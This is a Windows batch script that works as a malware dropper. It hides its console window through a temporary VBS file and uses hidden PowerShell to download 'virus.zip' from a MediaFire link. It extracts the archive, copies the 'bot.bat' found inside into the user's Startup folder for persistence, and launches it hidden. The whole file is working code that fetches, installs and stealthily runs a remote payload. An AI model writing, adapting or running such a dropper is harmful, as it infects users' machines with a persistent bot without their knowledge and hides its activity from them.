@echo off
:: Self-hiding mechanism via VBS – the console window will vanish instantly
set "args=%*"
if not defined HIDDEN (
    set HIDDEN=1
    echo Set objShell = CreateObject("WScript.Shell") > "%temp%\hideme.vbs"
    echo objShell.Run "cmd /c """"%~f0"" %args%""", 0, False >> "%temp%\hideme.vbs"
    cscript //nologo "%temp%\hideme.vbs"
    del "%temp%\hideme.vbs"
    exit /b
)

:: Enable delayed expansion for variable handling inside loops
setlocal enabledelayedexpansion

:: 1) Download the zip to %TEMP%
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://download1348.mediafire.com/36dblf0tt5igsUNOtr4I4ZSsmkanDpC9HDYhIBwyI8rsFQz6puSHc90lVDKIoBSo5zkoU_bkHC57zIAUHmlz_pukDjxvs8c3w_lQvMyf5Tncpe4sahRaNYJwyxLRtWdSBtbMHBpIgfYYPdy9Pxr5dp2qkKlt02aEWl82fcr4k2cu/cefa3ljyy89sue9/virus.zip', '%TEMP%\virus.zip')"

:: 2) Extract the zip into %TEMP% (overwrite if needed)
powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%TEMP%\virus.zip' -DestinationPath '%TEMP%' -Force"

:: 3) Recursively search for bot.bat inside %TEMP%
set "botpath="
for /r "%TEMP%" %%f in (bot.bat) do (
    if not defined botpath set "botpath=%%f"
)

:: If found, copy it to shell:startup and run it hidden
if defined botpath (
    copy "!botpath!" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\bot.bat" >nul 2>&1
    powershell -WindowStyle Hidden -Command "Start-Process '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\bot.bat' -WindowStyle Hidden"
)

:: Clean exit
endlocal
exit
